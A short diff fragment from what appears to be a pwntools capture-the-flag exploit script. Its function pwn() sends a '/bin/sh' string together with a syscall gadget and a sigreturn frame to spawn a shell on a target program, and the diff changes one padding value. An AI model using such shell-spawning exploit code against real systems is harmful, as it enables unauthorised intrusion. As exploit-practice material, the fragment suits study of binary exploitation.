@@ -230,7 +230,7 @@ def pwn():
     sysFrame.rdx = 0# system(0x600108,0,0)
     dLog("sysframe")
     sleep(0.1)
-    p.send(b"/bin/sh\x00"+p64(0)+p64(readRet)+p64(sysCall)+bytes(sysFrame))
+    p.send(b"/bin/sh\x00"+p64(0xdeadbeef)+p64(readRet)+p64(sysCall)+bytes(sysFrame))
 
     dLog("0xF 2")
     sleep(0.1)
